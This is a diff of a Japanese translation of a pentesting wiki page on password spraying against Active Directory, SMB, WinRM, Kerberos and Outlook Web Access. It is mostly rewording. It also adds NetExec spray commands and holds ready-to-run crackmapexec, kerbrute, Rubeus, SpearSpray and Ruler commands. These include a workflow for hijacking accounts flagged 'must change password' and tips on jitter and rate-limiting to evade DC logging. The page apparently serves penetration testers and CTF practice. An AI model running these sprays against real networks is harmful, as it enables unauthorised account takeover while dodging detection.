@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-いくつかの**valid usernames**を見つけたら、発見した各ユーザーに対して最も**common passwords**を試してみてください（環境のパスワードポリシーを考慮してください）。\
-By **default** the **minimum** **password** **length** is **7**.
+いくつかの**valid usernames**を見つけたら、発見した各ユーザーに対して最も一般的な**common passwords**を試すことができます（環境の**password policy**を考慮してください）。\
+デフォルトでは、**minimum** **password** **length**は**7**です。
 
-Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+一般的な**usernames**のリストも役立ちます: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-注意：複数の誤ったパスワードを試すと、アカウントがロックアウトされる**could lockout some accounts if you try several wrong passwords**可能性があります（デフォルトでは10回以上）。
+注意：**複数の間違ったpasswordsを試すと、いくつかのアカウントがlockoutされる可能性があります**（デフォルトでは10回以上）。
 
-### パスワードポリシーの取得
+### password policy の取得
 
-ドメインユーザーとしての資格情報やシェルがある場合、以下の方法で**パスワードポリシーを取得できます**:
+ドメインユーザーの資格情報やシェルがある場合、**password policy を取得するには次を使用できます**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -33,12 +33,27 @@ net accounts
 ```
 ### Linux（またはすべて）からのExploitation
 
-- **crackmapexec:** を使用
+- 使用 **crackmapexec:**
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
+```
+- **NetExec (CME successor)** を使用した、SMB/WinRM に対するターゲットを絞った低ノイズな spraying:
+```bash
+# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
+netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts
+
+# Spray a single candidate password against harvested users over SMB
+netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
+--continue-on-success --no-bruteforce --shares
+
+# Validate a hit over WinRM (or use SMB exec methods)
+netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"
+
+# Tip: sync your clock before Kerberos-based auth to avoid skew issues
+sudo ntpdate <DC_FQDN>
 ```
 - [**kerbrute**](https://github.com/ropnop/kerbrute) を使用する (Go)
 ```bash
@@ -51,12 +66,12 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- 使用 [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - 推奨されません。時々動作しないことがあります
+- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) を使用 (python) - 推奨されません。場合によっては動作しません
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-- **Metasploit** の `scanner/smb/smb_login` モジュールを使用して:
+- Metasploit の `scanner/smb/smb_login` モジュールを使用して:
 
 ![](<../../images/image (745).png>)
 
@@ -69,7 +84,7 @@ done
 ```
 #### Windowsから
 
-- brute module を備えたバージョンの [Rubeus](https://github.com/Zer1t0/Rubeus) を使用して:
+- [Rubeus](https://github.com/Zer1t0/Rubeus) の brute モジュール付きバージョンで:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -77,20 +92,20 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) を使用して（デフォルトでドメインからユーザーを生成でき、ドメインからパスワードポリシーを取得してそれに応じて試行回数を制限します）:
+- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) を使用して (デフォルトでドメインからユーザを生成でき、ドメインからパスワードポリシーを取得してそれに従って試行回数を制限します):
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-- を使用して [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
+- [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) を使用して
 ```
 Invoke-SprayEmptyPassword
 ```
-### 識別して乗っ取る "Password must change at next logon" アカウント (SAMR)
+### 「Password must change at next logon」アカウントの特定と乗っ取り (SAMR)
 
-低ノイズな手法としては、無害/空のパスワードをsprayして、STATUS_PASSWORD_MUST_CHANGEを返すアカウントを検出することがある。これはパスワードが強制的に失効しており、古いパスワードを知らなくても変更できることを示す。
+低ノイズな手法の一つは、spray a benign/empty password を実行して STATUS_PASSWORD_MUST_CHANGE を返すアカウントを検出することです。これはパスワードが強制的に期限切れにされており、古いパスワードを知らなくても変更できることを示します。
 
 Workflow:
-- ユーザーを列挙して (RID brute via SAMR) ターゲットリストを作成する:
+- ユーザーを列挙して（RID brute via SAMR）ターゲットリストを作成する:
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
@@ -99,12 +114,12 @@ Workflow:
 # NetExec (null/guest) + RID brute to harvest users
 netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
 ```
-- Spray an empty password を試行し、hits が出ても続行して、next logon 時にパスワード変更が必要なアカウントを捕捉する:
+- Spray an empty password を試し、ヒットが出ても続けて、次回ログオン時に password を変更する必要があるアカウントを取得する:
 ```bash
 # Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
 netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
 ```
-- 各 hit ごとに、NetExec’s module を使って SAMR 経由でパスワードを変更する（"must change" が設定されている場合は古いパスワードは不要）:
+- 各ヒットについて、NetExecのモジュールを使ってSAMR経由でpasswordを変更する（"must change" が設定されている場合、古い password は不要）：
 ```bash
 # Strong complexity to satisfy policy
 env NEWPASS='P@ssw0rd!2025#' ; \
@@ -113,9 +128,9 @@ netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
 # Validate and retrieve domain password policy with the new creds
 netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
 ```
-運用ノート:
-- Kerberos-based operations を行う前に、ホストの時計をDCと同期させてください: `sudo ntpdate <dc_fqdn>`.
-- 一部のモジュール（例：RDP/WinRM）で (Pwn3d!) なしの [+] は、creds が有効だが、アカウントに対話型ログオン権がないことを意味します。
+運用上の注意:
+- Kerberos ベースの操作を行う前に、ホストの時計が DC と同期していることを確認してください: `sudo ntpdate <dc_fqdn>`.
+- 一部のモジュール (例: RDP/WinRM) で (Pwn3d!) が付かない [+] は、creds は有効だがアカウントに対話型ログオン権限がないことを意味します。
 
 ## Brute Force
 ```bash
@@ -123,15 +138,15 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 ```
 ### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
 
-Kerberos pre-auth ベースのスプレーは、SMB/NTLM/LDAP バインド試行と比べてノイズを減らし、AD のロックアウトポリシーとより整合します。SpearSpray は LDAP 駆動のターゲティング、パターンエンジン、ポリシー認識（ドメインポリシー + PSOs + badPwdCount バッファ）を組み合わせ、正確かつ安全にスプレーします。また、侵害されたプリンシパルを Neo4j にタグ付けして BloodHound のパス探索に利用できます。
+Kerberos pre-auth によるスプレーは SMB/NTLM/LDAP バインド試行と比べてノイズが少なく、AD のロックアウトポリシーとより整合します。SpearSpray は LDAP 駆動のターゲティング、パターンエンジン、ポリシー認識（domain policy + PSOs + badPwdCount buffer）を組み合わせて、正確かつ安全にスプレーを行います。侵害したプリンシパルを Neo4j にタグ付けして BloodHound のパス探索に利用することもできます。
 
 Key ideas:
 - LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
-- ドメインロックアウトポリシーと PSO 対応フィルタにより、設定可能な試行バッファ（閾値）を残してユーザーのロックを回避。
-- Kerberos pre-auth 検証は高速な gssapi バインディングを使用（DCs では 4625 の代わりに 4768/4771 を生成）。
-- ユーザーごとのパターンベースなパスワード生成で、名前や各ユーザーの pwdLastSet から導出される時間関連値などの変数を使用。
-- スループット制御（スレッド、ジッター、秒あたり最大リクエスト数）。
-- オプションの Neo4j 統合で所有済みユーザーにマークを付け、BloodHound に連携。
+- ドメインのロックアウトポリシーと PSO 対応フィルタリングにより、設定可能な試行バッファ（threshold）を残してユーザのロックを回避します。
+- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
+- 名前や各ユーザの pwdLastSet から導出された時刻値などの変数を使った、パターンベースのユーザごとのパスワード生成。
+- スループット制御：threads、jitter、および max requests per second による調整。
+- Optional Neo4j integration to mark owned users for BloodHound.
 
 Basic usage and discovery:
 ```bash
@@ -144,7 +159,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # LDAPS (TCP/636)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
 ```
-ターゲティングとパターン制御:
+ターゲティングとパターンの制御:
 ```bash
 # Custom LDAP filter (e.g., target specific OU/attributes)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
@@ -153,7 +168,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
 ```
-Stealth と安全対策：
+ステルスと安全対策:
 ```bash
 # Control concurrency, add jitter, and cap request rate
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10
@@ -180,23 +195,23 @@ Available variables include:
 - Composition helpers and org token: {separator}, {suffix}, {extra}
 
 Operational notes:
-- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
-- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
-- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.
+- より権威ある badPwdCount とポリシー関連情報を取得するには、-dc オプションで PDC-emulator に問い合わせることを優先してください。
+- badPwdCount のリセットは観測ウィンドウ後の次の試行で発生します。安全を保つため、しきい値とタイミングを考慮してください。
+- Kerberos pre-auth の試行は DC のテレメトリで 4768/4771 として現れます。jitter と rate-limiting を使って目立たないようにしてください。
 
 > Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.
 
 ## Outlook Web Access
 
-Outlook に対する p**assword spraying outlook** を行うためのツールはいくつかあります。
+p**assword spraying outlook** のためのツールが複数あります。
 
 - [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/) を使用
 - [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/) を使用
-- [Ruler](https://github.com/sensepost/ruler) を使用（信頼性あり）
-- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) を使用（Powershell）
-- [MailSniper](https://github.com/dafthack/MailSniper) を使用（Powershell）
+- [Ruler](https://github.com/sensepost/ruler) （信頼性あり！）
+- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell) を使用
+- [MailSniper](https://github.com/dafthack/MailSniper) (Powershell) を使用
 
-これらのツールを使用するには、ユーザーリストとスプレーするためのパスワード／小さなパスワードリストが必要です。
+これらのツールを使うには、ユーザーリストとスプレーするための password または少数の password リストが必要です。
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -227,6 +242,7 @@ Outlook に対する p**assword spraying outlook** を行うためのツール�
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 - [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
